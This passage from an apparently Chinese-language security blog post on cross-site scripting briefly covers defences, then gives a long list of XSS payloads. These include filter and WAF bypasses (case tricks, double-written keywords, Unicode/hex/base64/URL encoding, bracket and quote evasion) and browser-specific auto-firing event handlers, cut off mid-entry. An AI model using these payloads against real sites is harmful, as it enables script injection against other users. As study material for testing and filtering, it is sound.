XSS 检测与防范，默认开启</li></ol></li><li>添加验证码机制（防止脚本冒充用户提交危险操作）</li></ol><p>上面都是目前的一些防御机制，常见的防御方法：<br>通过前面的可以知道，XSS 攻击有两大要素：</p><ol><li>攻击者提交恶意代码。</li><li>浏览器执行恶意代码。</li></ol><p>根本的解决方法：从输入到输出都需要过滤、转义。<br>输入：</p><ol><li>HTML编码<br><img src="/236463394/1.png" alt></li><li>过滤一些危险标签，白名单的话更为保险</li></ol><p>输出：<br>具体场景具体安排:<a href="https://juejin.im/post/5bad9140e51d450e935c6d64#heading-13" target="_blank" rel="noopener">https://juejin.im/post/5bad9140e51d450e935c6d64#heading-13</a><br>总结的很详细了。<br>实际上XSS的防御时分繁琐，不和其他的漏洞一样，又更为具体的防御方法，我认为主要是，范围广，前端，后端都有可能造成这种漏洞，而且仍和输入输出都是可能会有机会产生XSS的。</p><blockquote><p>下面摘自<a href="https://juejin.im/post/5bad9140e51d450e935c6d64#heading-24" target="_blank" rel="noopener">https://juejin.im/post/5bad9140e51d450e935c6d64#heading-24</a></p></blockquote><p><img src="/236463394/2.png" alt></p><h2 id="0x05-bypass"><a href="#0x05-bypass" class="headerlink" title="0x05 bypass"></a>0x05 bypass</h2><p>这个绕过就更多了……花里胡哨。先说下完全没过滤的情况下<br>一般输出再标签内，一般就可以试一下是否有xss，如：</p><pre><code>&lt;input value=&quot;输出&quot;&gt;&lt;img onload=&quot;...[输出]...&quot;&gt;&lt;body style=&quot;...[输出]...&quot;&gt;</code></pre><p>标签之间可以执行也是可以执行的，不能执行的话就要考虑闭合标签</p><pre><code>&lt;div&gt;[输出]&lt;/div&gt;</code></pre><p>下面列一些常见标签，引用自<a href="https://xz.aliyun.com/t/4067#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-22</a></p><h3 id="5-1常见标签"><a href="#5-1常见标签" class="headerlink" title="5.1常见标签"></a>5.1常见标签</h3><h4 id="lt-script-gt"><a href="#lt-script-gt" class="headerlink" title="&lt;script&gt;"></a>&lt;script&gt;</h4><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></pre><h4 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h4><pre><code>&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</code></pre><h4 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="&lt;input&gt;"></a>&lt;input&gt;</h4><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;竞争焦点，从而触发onblur事件&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</code></pre><h4 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="&lt;details&gt;"></a>&lt;details&gt;</h4><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;使用open属性触发ontoggle事件，无需用户去触发&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code></pre><h4 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="&lt;svg&gt;"></a>&lt;svg&gt;</h4><pre><code>&lt;svg onload=alert(&quot;xss&quot;);&gt;</code></pre><h4 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="&lt;select&gt;"></a>&lt;select&gt;</h4><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发&lt;select onfocus=alert(1) autofocus&gt;</code></pre><h4 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h4><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</code></pre><h4 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="&lt;video&gt;"></a>&lt;video&gt;</h4><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><h4 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt;audio&gt;"></a>&lt;audio&gt;</h4><pre><code>&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</code></pre><h4 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="&lt;body&gt;"></a>&lt;body&gt;</h4><pre><code>&lt;body/onload=alert(&quot;xss&quot;);&gt;</code></pre><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><pre><code>&lt;bodyonscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><h4 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="&lt;textarea&gt;"></a>&lt;textarea&gt;</h4><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><h4 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="&lt;keygen&gt;"></a>&lt;keygen&gt;</h4><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><h4 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="&lt;marquee&gt;"></a>&lt;marquee&gt;</h4><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><h4 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="&lt;isindex&gt;"></a>&lt;isindex&gt;</h4><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre><h4 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h4><p>PS：在无CSP的情况下才可以</p><pre><code>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><h4 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h4><h5 id="lt-a-gt"><a href="#lt-a-gt" class="headerlink" title="&lt;a&gt;"></a>&lt;a&gt;</h5><pre><code>&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</code></pre><h5 id="lt-iframe-gt-1"><a href="#lt-iframe-gt-1" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h5><pre><code>&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;</code></pre><h5 id="lt-img-gt-1"><a href="#lt-img-gt-1" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h5><pre><code>&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下</code></pre><h5 id="lt-form-gt"><a href="#lt-form-gt" class="headerlink" title="&lt;form&gt;"></a>&lt;form&gt;</h5><pre><code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>expression属性</p><pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下&lt;div style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下</code></pre><p>background属性</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h3 id="5-2根据情况的bypass"><a href="#5-2根据情况的bypass" class="headerlink" title="5.2根据情况的bypass"></a>5.2根据情况的bypass</h3><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>用<code>/</code>代替空格</p><pre class=" language-html"><code class="language-html">&lt;img/src="x"/onerror=alert("xss");></code></pre><h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><strong>大小写绕过</strong>：</p><pre class=" language-html"><code class="language-html">&lt;ImG sRc=x onerRor=alert("xss");></code></pre><p><strong>双写绕过</strong>：<br>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><pre class=" language-html"><code class="language-html">&lt;imimgg srsrcc=x onerror=alert("xss");></code></pre><p><strong>字符拼接</strong>：</p><pre class=" language-html"><code class="language-html">利用eval<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">=</span>`aler`;b<span class="token punctuation">=</span>`t`;c<span class="token punctuation">=</span><span class="token punctuation">'</span>(`xss`);<span class="token punctuation">'</span>;eval(a+b+c)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>利用top<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">top<span class="token punctuation">[</span><span class="token string">"al"</span><span class="token operator">+</span><span class="token string">"ert"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`xss`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><strong>其他字符混淆</strong>：</p><pre><code>可利用注释、标签的优先级等1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</code></pre><p><strong>编码绕过</strong></p><p>编码需要注意一些问题：<br>html标签中：</p><ol><li>html中当然会支持html实体编码，例如&amp;#61，也有&lt;</li><li>支持十六进制，但是要以&amp;#x开头，其中x大写小写无所谓。</li><li>支持十进制，要以&amp;#开头，注意，没有x哦。</li><li>支持数字部分高位补充0，例如&amp;#00000000061，&amp;#61这两是一样的。</li></ol><p>javascript中：</p><ol><li>eval函数里，支持十六进制，但是要以 \x 开头，x只能小写！必须两位，例如：\x5c</li><li>eval函数里，支持八进制，但是要以 \ 开头。必须两位，例如：\134</li><li>eval函数里，还支持\u前缀的unicode，本质是：16进制的ascii码。必须是四位，例如：\u005c</li></ol><p>可以结合利用，比如&lt;img&gt;是一个标签，支持html编码，eval支持其他编码，构造如下：<br><code>&lt;img src=# onerror=&amp;#x65;val(&quot;\x61\x6cert(/xss/)&quot;)&gt;</code></p><p>常见编码绕过（原理都差不多，基于eval编码函数，对payload进行编码，然后解码，同其他漏洞编码绕过类似,，比较需要注意的是data协议的利用）：</p><p>Unicode编码绕过</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eval(<span class="token punctuation">'</span>\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>url编码绕过</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eval(unescape(<span class="token punctuation">'</span>%61%6c%65%72%74%28%22%78%73%73%22%29%3b<span class="token punctuation">'</span>))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><p>Ascii码绕过：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>hex绕过</p><pre class=" language-html"><code class="language-html">&lt;img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')></code></pre><p>八进制绕过</p><pre class=" language-html"><code class="language-html">&lt;img src=x onerror=alert('\170\163\163')></code></pre><p>base64绕过</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eval(atob(<span class="token punctuation">'</span>ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw<span class="token punctuation">=</span><span class="token punctuation">=</span><span class="token punctuation">'</span>))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><h4 id="过滤单引号、双引号"><a href="#过滤单引号、双引号" class="headerlink" title="过滤单引号、双引号"></a>过滤单引号、双引号</h4><ol><li>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(`xss`);</span><span class="token punctuation">></span></span></code></pre></li><li>使用编码绕过，</li></ol><h4 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h4><ol><li><p>当括号被过滤的时候可以使用throw来绕过</p><pre class=" language-html"><code class="language-html">&lt;svg/onload="window.onerror=eval;throw'=alert\x281\x29';"></code></pre></li><li><p>也可以考虑利用编码绕过，例如下面的例子：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1111111</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert&amp;lpar;1&amp;rpar;</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1111111</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>javascript:alert&amp;#x28;1&amp;#x29</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert&amp;#40/1/&amp;#41<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>axxx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">alert<span class="token operator">&amp;</span>#<span class="token number">40</span>      <span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert&amp;#40;1&amp;#41;</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert`1`</span><span class="token punctuation">></span></span></code></pre></li></ol><h4 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h4><ol><li><p>url编码</p><pre class=" language-html"><code class="language-html">&lt;img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`></code></pre></li><li><p>使用其他进制的IP（可参考ssrf中的进制转换）</p></li><li><p>用//替代http://<br><code>&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;</code></p></li><li><p>使用<code>\\</code></p></li><li><p>使用中文逗号代替英文逗号（和ssrf一样）</p></li></ol><p>以上参考自<a href="https://xz.aliyun.com/t/4067#toc-27" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-27</a> </p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>XSS知识有点零碎，涉及的比较多，这里我就稍作了解吧，以后遇到解决不了的再深入，一些其他东西会放到PS里面，然后用思维导图整理下</p><h2 id="0x07-PS"><a href="#0x07-PS" class="headerlink" title="0x07 PS"></a>0x07 PS</h2><h3 id="on事件"><a href="#on事件" class="headerlink" title="on事件"></a>on事件</h3><pre><code>onloadonclickonunloadonchangeonsubmitonresetonselectonbluronfocusonabortonkeydownonkeypressonkeyupondbclickonmouseoveronmousemoveonmouseoutonmouseuponforminputonformchangeondragondrop</code></pre><h3 id="可以执行JS的标签"><a href="#可以执行JS的标签" class="headerlink" title="可以执行JS的标签"></a>可以执行JS的标签</h3><pre><code>&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt;&lt;body&gt;&lt;button&gt;&lt;var&gt;&lt;div&gt;&lt;iframe&gt;&lt;object&gt;&lt;input&gt;&lt;select&gt;&lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt;</code></pre><h3 id="可以执行js的属性"><a href="#可以执行js的属性" class="headerlink" title="可以执行js的属性"></a>可以执行js的属性</h3><pre><code>formactionactionhrefxlink:hrefautofocussrccontentdata</code></pre><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200403143705.png" alt></p><h3 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h3><p>收藏一下，当字典用</p><hr><p>这是一份跨站脚本（XSS）备忘录，收集了大量的XSS攻击向量，包含了各种事件处理、通讯协议、特殊属性、限制字符、编码方式、沙箱逃逸等技巧，可以帮助渗透测试人员绕过WAF和过滤机制。<br>网址：<a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448904601&idx=1&sn=3c8fd18363ddb3b7b6b5f33565696186&chksm=8b55c1c4bc2248d2c2b935b3980652ce576f4d532e63ca4c72f9a7a4cbafb2c9e6a62abca620&mpshare=1&scene=1&srcid=&sharer_sharetime=1576462865354&sharer_shareid=9aaf420661f2f9968b23fa8064773d63#rd" target="_blank" rel="noopener">跨站脚本（XSS）备忘录-2019版</a></p><hr><h4 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h4><h5 id="不需要用户交互的事件处理程序"><a href="#不需要用户交互的事件处理程序" class="headerlink" title="不需要用户交互的事件处理程序"></a>不需要用户交互的事件处理程序</h5><p>激活元素时触发(IE)</p><pre><code>&lt;a id=x tabindex=1 onactivate=alert(1)&gt;&lt;/a&gt;</code></pre><p>页面打印后触发（Chrome、Firefox、IE)</p><pre><code>&lt;body onafterprint=alert(1)&gt;</code></pre><p>CSS动画取消时触发(Firefox)</p><pre><code>&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;a id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>CSS动画结束时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;a style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>重复CSS动画时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;a style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>CSS动画开始时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;a style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>在激活元素之前触发（IE）</p><pre><code>&lt;a id=x tabindex=1 onbeforeactivate=alert(1)&gt;&lt;/a&gt;</code></pre><p>在停用元素之前触发（IE）</p><pre><code> &lt;a id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/a&gt;&lt;input autofocus&gt;</code></pre><p>在页面打印前触发（Chrome、Firefox、IE)</p><pre><code>&lt;body onbeforeprint=alert(1)&gt;</code></pre><p>网址更改后触发（Chrome）</p><pre><code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</code></pre><p>svg动画开始时触发（Chrome、Firefox、Safari）</p><pre><code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</code></pre><p>当元素失去焦点时触发（Chrome、IE、Safari）</p><pre><code>&lt;a onblur=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input autofocus&gt;</code></pre><p>选框弹跳时触发（Firefox、IE）</p><pre><code>&lt;marquee width=1 loop=1 onbounce=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre><p>如果资源可以播放则触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio oncanplay=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>加载足够的数据以完全播放资源时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;video oncanplaythrough=alert(1)&gt;&lt;source src=&quot;validvideo.mp4&quot; type=&quot;video/mp4&quot;&gt;&lt;/video&gt;</code></pre><p>停用元素时触发（IE）</p><pre><code>&lt;a id=x tabindex=1 ondeactivate=alert(1)&gt;&lt;/a&gt;&lt;input id=y autofocus&gt;</code></pre><p>资源播放完毕时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio controls autoplay onended=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>资源加载失败或导致错误时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio src/onerror=alert(1)&gt;</code></pre><p>选框完成时触发（Firefox、IE)</p><pre><code>&lt;marquee width=1 loop=1 onfinish=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre><p>当元素具有焦点时触发（Chrome、IE、Safari)</p><pre><code> &lt;a id=x tabindex=1 onfocus=alert(1)&gt;&lt;/a&gt;</code></pre><p>当元素具有焦点时触发（Chrome、IE、Safari)</p><pre><code>&lt;a id=x tabindex=1 onfocusin=alert(1)&gt;&lt;/a&gt;</code></pre><p>当元素失去焦点时触发（Chrome、IE、Safari)</p><pre><code>&lt;a onfocusout=alert(1) tabindex=1 id=x&gt;&lt;/a&gt;&lt;input autofocus&gt;</code></pre><p>如果哈希值更改，则触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;body onhashchange=&quot;alert(1)&quot;&gt;</code></pre><p>加载元素时触发（Safari)</p><pre><code>&lt;svg&gt;&lt;a onload=alert(1)&gt;&lt;/a&gt;</code></pre><p>加载第一帧时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio onloadeddata=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>加载元数据时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay onloadedmetadata=alert(1)&gt; &lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>当元素完成加载时触发（Firefox)</p><pre><code>&lt;image src=validimage.png onloadend=alert(1)&gt;</code></pre><p>当元素开始加载时触发（Firefox)</p><pre><code>&lt;image src=validimage.png onloadstart=alert(1)&gt;</code></pre><p>当从postMessage调用接收到消息事件时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;body onmessage=alert(1)&gt;</code></pre><p>显示页面时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;body onpageshow=alert(1)&gt;</code></pre><p>播放资源时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay onplay=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>触发资源正在播放（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio autoplay onplaying=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>历史记录更改时触发（Chrome、Firefox、IE、Safari)</p><pre><code> &lt;body onpopstate=alert(1)&gt;</code></pre><p>svg动画重复时触发（Chrome、Firefox、Safari)</p><pre><code>&lt;svg&gt;&lt;animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 /&gt;</code></pre><p>调整窗口大小时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;body onresize=&quot;alert(1)&quot;&gt;</code></pre><p>页面滚动时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;body onscroll=alert(1)&gt;&lt;div style=height:1000px&gt;&lt;/div&gt;&lt;div id=x&gt;&lt;/div&gt;</code></pre><p>选框开始时触发（Firefox、IE)</p><pre><code>&lt;marquee onstart=alert(1)&gt;XSS&lt;/marquee&gt;</code></pre><p>更改时间轴时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;audio controls autoplay ontimeupdate=alert(1)&gt;&lt;source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;&gt;&lt;/audio&gt;</code></pre><p>展开详细信息标签时触发（Chrome、Firefox、IE、Safari)</p><pre><code>&lt;details ontoggle=alert(1) open&gt;test&lt;/details&gt;</code></pre><p>CSS过渡取消时触发（Firefox)</p><pre><code>&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;a id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)&gt;&lt;/a&gt;</code></pre><p>CSS过渡结束时触发（Chrome)</p><pre><code>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;a id=x style=&quot;transition:color 1s&quot; 